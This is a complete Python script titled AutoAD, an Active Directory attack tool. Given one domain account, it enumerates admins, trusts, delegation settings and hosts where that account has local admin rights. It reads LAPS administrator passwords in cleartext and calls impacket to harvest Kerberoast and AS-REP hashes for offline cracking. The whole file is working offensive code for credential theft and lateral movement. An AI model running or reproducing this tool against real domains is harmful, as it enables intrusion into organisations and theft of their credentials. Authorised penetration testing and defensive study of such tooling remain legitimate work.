#!/usr/bin/python3
import ldap
import sys
import argparse
from shutil import which
import subprocess
from smb.SMBConnection import SMBConnection
import dns.resolver
from impacket.dcerpc.v5 import transport, scmr
import threading
import struct
from impacket.uuid import uuidtup_to_bin
from datetime import datetime
from termcolor import cprint


def banner():
    print(r""" 
	    
	 █████╗ ██╗   ██╗████████╗ ██████╗      █████╗ ██████╗ 
	██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██╔══██╗██╔══██╗
	███████║██║   ██║   ██║   ██║   ██║    ███████║██║  ██║
	██╔══██║██║   ██║   ██║   ██║   ██║    ██╔══██║██║  ██║
	██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ██║  ██║██████╔╝
	╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚═╝  ╚═╝╚═════╝ 
			                                      by M-Arman
                                                       """)

def create_type(name, **kwargs):
    return type(name, (object,), kwargs)

def sid_to_str(sid):
# Stolen from: https://gist.github.com/mprahl/e38a2eba6da09b2f6bd69d30fd3b749e
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]
    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]

    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))


def check_admin(computer):
# Good read: https://threathunterplaybook.com/library/windows/service_control_manager.html
    try:
        if cfg.dns_mode=='1':
            computer_ip = dnscfg.resolve(computer)[0].to_text()
        else:
            computer_ip = computer
        rpctransport = transport.SMBTransport(computer_ip, filename=r'\svcctl')
        rpctransport.set_credentials(username=user, password=password, domain=domain, lmhash='', nthash='', aesKey='')
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)
        scmr.hROpenSCManagerW(dce,'{}\x00'.format(computer),'ServicesActive\x00', 0xF003F)
        print("Local Admin access as " + user +" found on " + computer)        
    except:
        pass


def check_spool(controllers):
    MSRPC_UUID_SPOOLSS  = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB','1.0'))
    for controller in controllers:
        try:
            if cfg.dns_mode=='1':
                controller_ip = dnscfg.resolve(controller)[0].to_text()
            else:
                controller_ip = controller
            rpctransport = transport.DCERPCTransportFactory('ncacn_np:'+controller_ip+'[\pipe\spoolss]')
            rpctransport.set_credentials(username=user, password=password, domain=domain, lmhash='', nthash='', aesKey='')
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(MSRPC_UUID_SPOOLSS)
            print(controller + ' [Printer Spool Enabled]')     
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                print(controller + ' [Printer Spool Disabled]')
            else:
                print(controller + ' [Printer Spool Unknown]') 


def connect():
    lobj = ldap.initialize("ldap://"+dc)
    try:
        lobj.protocol_version = ldap.VERSION3
        lobj.set_option(ldap.OPT_REFERRALS, 0)
        lobj.simple_bind_s(username, password)
        return lobj
    except ldap.INVALID_CREDENTIALS:
        print("Invalid Credentials")
        sys.exit()
    except ldap.SERVER_DOWN:
        print("Unable to connect to the domain controller.")
        sys.exit()
    except ldap.LDAPError as e:
        if type(e.message) == dict and e.message.has_key('desc'):
            print(e.message['desc'])
        else: 
            print(e)
        sys.exit()


def ldap_query(connection, options, attr):
    try:
        page_control = ldap.controls.SimplePagedResultsControl(True, size=500, cookie='')
        if attr:
            response = connection.search_ext(options[0], ldap.SCOPE_SUBTREE, options[1], options[2], serverctrls=[page_control])
        else:
            response = connection.search_ext(options[0], ldap.SCOPE_SUBTREE, options[1], [], serverctrls=[page_control])
        result = []
        pages = 0
        while True:
            pages += 1
            rtype, rdata, rmsgid, serverctrls = connection.result3(response)
            result.extend(rdata)
            controls = [control for control in serverctrls
                        if control.controlType == ldap.controls.SimplePagedResultsControl.controlType]
            if not controls:
                print('The server ignores RFC 2696 control')
                break
            if not controls[0].cookie:
                break
            page_control.cookie = controls[0].cookie
            if attr:
                response = connection.search_ext(options[0], ldap.SCOPE_SUBTREE, options[1], options[2], serverctrls=[page_control])
            else:
                response = connection.search_ext(options[0], ldap.SCOPE_SUBTREE, options[1], [], serverctrls=[page_control])
        return ([entry for dn, entry in result if isinstance(entry, dict)])
        
    except ldap.LDAPError as e:
        if type(e.message) == dict and e.message.has_key('desc'):
            print(e.message['desc'])
        else: 
            print(e)


def recon(connection):
    base = ', '.join('dc='+dn for dn in domain.split("."))
    # Get domain controllers
    query = [base, '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', ['dNSHostName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Domain Controllers:",'red')
    check_spool([result['dNSHostName'][0].decode() for result in results if result])

    # Get SID of the domain
    query = [base, '(&(objectCategory=person)(objectClass=user)(cn=Administrator))', ['objectSid']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Domain SID:", 'red')
    print(','.join(sid_to_str(result['objectSid'][0]).rsplit('-', 1)[0] for result in results))

    # Domain Admins
    query = [base, '(&(ObjectClass=Group)(cn=Domain Admins))', ['distinguishedName']]
    results = ldap_query(connection, query, 1)
    dn = results[0]['distinguishedName'][0].decode()
    query = [base, '(memberOf:1.2.840.113556.1.4.1941:='+dn+')', ['sAMAccountName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Domain Administrators:" ,'red')
    print('\n'.join(result['sAMAccountName'][0].decode() for result in results )) 
    
    # Get GPOs
    query = [base, '(objectCategory=groupPolicyContainer)', ['displayName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] GPO List:", 'red')
    print('\n'.join(result['displayName'][0].decode() for result in results))

    # Get DomainTrust
    query = [base, '(&(objectClass=trustedDomain))']
    results = ldap_query(connection, query, 0)

    TrustAttributes = {
	'0' : '',
	'1' : 'NON_TRANSITIVE',
	'2' : 'UPLEVEL_ONLY',
	'4' : 'FILTER_SIDS',
	'8' : 'FOREST_TRANSITIVE',
	'10' : 'CROSS_ORGANIZATION',
	'20' : 'WITHIN_FOREST',
	'40' : 'TREAT_AS_EXTERNAL',
	'80' : 'TRUST_USES_RC4_ENCRYPTION',
	'100' : 'TRUST_USES_AES_KEYS',
	'200' : 'CROSS_ORGANIZATION_NO_TGT_DELEGATION',
	'400' : 'PIM_TRUST'
    }
		
    TrustTypes = {
	'1' : 'WINDOWS_NON_ACTIVE_DIRECTORY',
	'2' : 'WINDOWS_ACTIVE_DIRECTORY',
	'3' : 'MIT'
	}
	
    TrustDirection = {
	'0' : 'Disabled',
	'1' : 'Inbound',
	'2' : 'Outbound',
	'3' : 'Bidirectional'
	}

    cprint("\n[+] Domain Trust:", 'red')
    if results:
        for result in results:
            print('SourceName       : ' + domain)
            print('TargetName       : ' + result['trustPartner'][0].decode())
            print('TrustType        : ' + TrustTypes.get(result['trustType'][0].decode(), ''))
            print('TrustAttributes  : ' + TrustAttributes.get(result['trustAttributes'][0].decode(), ''))
            print('TrustDirection   : ' + TrustDirection.get(result['trustDirection'][0].decode(), ''))
            print('WhenCreated      :' , datetime.strptime(result['whenCreated'][0].decode(), '%Y%m%d%H%M%S.0Z'))
            print('WhenChanged      :' , datetime.strptime(result['whenChanged'][0].decode(), '%Y%m%d%H%M%S.0Z'))
    else:
        print("None found.")
        
    # Check admin access on computers
    cprint("\n[+] Local Admin access:", 'red')
    query = [base, '(objectCategory=computer)', ['dNSHostName']]
    results = ldap_query(connection, query, 1)
    computers = [result['dNSHostName'][0].decode() for result in results if result]
    threads = []
    if results:
        for computer in computers:
            try:
                check_thread = threading.Thread(target=check_admin, args=(computer,))
                threads.append(check_thread)
                check_thread.start()
            except:
                pass
        for thread in threads:
            thread.join()
    else:
        print("None found.")

    # Kerberoastable Users
    query = [base, '(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))', ['sAMAccountName']]
    results = ldap_query(connection, query, 0)
    cprint("\n[+] Kerberoastable Users:", 'red')
    if results:
        print('\n'.join(result['sAMAccountName'][0].decode() for result in results ))   
    else:
        print("None found.") 
    
    # DONT_REQ_PREAUTH
    query = [base, '(userAccountControl:1.2.840.113556.1.4.803:=4194304)', ['sAMAccountName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Users without Kerberos pre-auth required (DONT_REQ_PREAUTH):", 'red')
    if results:
        print(', '.join(result['sAMAccountName'][0].decode() for result in results ))
    else:
        print("None found.")

    # Unconstrained Delegation
    query = [base, '(userAccountControl:1.2.840.113556.1.4.803:=524288)', ['sAMAccountName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Unconstrained Delegation:", 'red')
    if results:
        print(', '.join(result['sAMAccountName'][0].decode() for result in results))
    else:
        print("None found.")

    # Constrained Delegation - Protocol Transition
    query = [base, '(msDS-AllowedToDelegateTo=*)', ['sAMAccountName', 'msDS-AllowedToDelegateTo']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Contrained Delegation:", 'red')
    if results:
        print(', '.join(result['sAMAccountName'][0].decode()+" allowed to delegate to "+result['msDS-AllowedToDelegateTo'][1].decode() for result in results ))
    else:
        print("None found.")
   
    # Constrained Delegation - Resource Based
    query = [base, '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)', ['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Contrained Delegation - Resource Based (msDS-AllowedToActOnBehalfOfOtherIdentity):" ,'red')
    if results:
        print(', '.join(result['sAMAccountName'][0].decode() for result in results ))
    else:
        print("None found.")

    # LAPS
    query = [base, '(ms-MCS-AdmPwd=*)', ['sAMAccountName','ms-Mcs-AdmPwd']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] LAPS Credentials found:", 'red')
    if results:
        print(', '.join(result['sAMAccountName'][0].decode()+":"+result['ms-Mcs-AdmPwd'][0].decode() for result in results )) 
    else:
        print("None found.")
    
    # All Users and Users with descriptions
    query = [base, '(&(objectCategory=person)(objectClass=user))', ['sAMAccountName','description']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Saved all users to users.txt", 'red')
    with open('users.txt', 'w') as f:
        for result in results:
            f.write("%s\n" % result['sAMAccountName'][0].decode())
    with open('users-desc.txt', 'w') as f:
        for result in results:
            try:
                f.write("Username: %s, Description: %s\n" %(result['sAMAccountName'][0].decode(),result['description'][0].decode()))
            except:
                pass
    cprint("\n[+] Saved all users that have descriptions to users-desc.txt", 'red')

    # All Groups
    query = [base, '(objectCategory=group)', ['sAMAccountName']]
    results = ldap_query(connection, query, 1)
    cprint("\n[+] Saved all groups to groups.txt", 'red')
    groups = [result['sAMAccountName'][0].decode() for result in results if result]
    with open('groups.txt', 'w') as f:
        for group in groups:
            f.write("%s\n" % group)

    # All Computers
    cprint("\n[+] Saved all computers to computers.txt", 'red')
    with open('computers.txt', 'w') as f:
        for computer in computers:
            f.write("%s\n" % computer)

    # Get tickets for Kerberoastable Users
    impacket_path = which('GetUserSPNs.py')
    if impacket_path:
        try:
            subprocess.check_call(['%s -request -dc-ip %s "%s/%s:%s" -outputfile Kroasted.txt' %(impacket_path, dc, domain, user, password)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
            cprint("\n[+] Saved TGS hashes to Kroasted.txt for offline cracking." ,'red')
        except subprocess.CalledProcessError:
            print("[-] Something went wrong with saving the hashes.")
    else:
        print("[-] GetUsersSPNs.py was not found, skipping obtaining hashes.")

    # Get tickets for DONT_REQ_PREAUTH Users
    impacket_path = which('GetNPUsers.py')
    if impacket_path:
        try:
            subprocess.check_call(['%s -request -dc-ip %s "%s/%s:%s" -outputfile Kasrep.txt' %(impacket_path, dc, domain, user, password)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
            cprint("\n[+] Saved TGT hashes to Kasrep.txt for offline cracking. \n", 'red')
        except subprocess.CalledProcessError:
            print("[-] Something went wrong with saving the hashes.")
    else:
        print("[-] GetNPUsers.py was not found, skipping obtaining hashes.")


if __name__ == "__main__":

    #banner
    banner()

    #Arguments Parser
    parser = argparse.ArgumentParser(description='AutoAD - Simple python script for AD enumeration')

    parser.add_argument('-user', action='store',
                    dest='username',
                    help='Username for the account that will be used for authentication. (format: user@domain.local)',
                    required=True)

    parser.add_argument('-pass', action='store',
                    dest='password',
                    help='Password for the account that will be used for authentication.',
                    required=True)

    parser.add_argument('-dc-ip', action='store',
                    dest='dc_ip',
                    help='The IP address for the domain controller that will be queried for results.',
                    required=True)
    parser.add_argument('-dns-mode', action='store',
                    dest='dns_mode', default='1',
                    help="1: Use DC-IP as DNS server (default), 2: Use system default DNS configurations (proxychains/joined machine)")
    cfg = parser.parse_args()

    #Preparing arguments
    if '@' in cfg.username:
        username = cfg.username
        user = username.split('@')[0]
        domain = cfg.username.split('@')[1]
    else:
        print("Username must be in the format username@domain.local.")
        exit()
    
    dc = cfg.dc_ip
    password = cfg.password

    # Using Domain controller as main DNS server
    if cfg.dns_mode == '1':
        dnscfg = dns.resolver.Resolver(configure=False)
        dnscfg.nameservers = [dc]
    elif cfg.dns_mode != '2':
        print("Please pick a valid DNS mode, check help for more information.")
        exit()

    #Starting the enumeration
    connection = connect()
    recon(connection)
    connection.unbind()
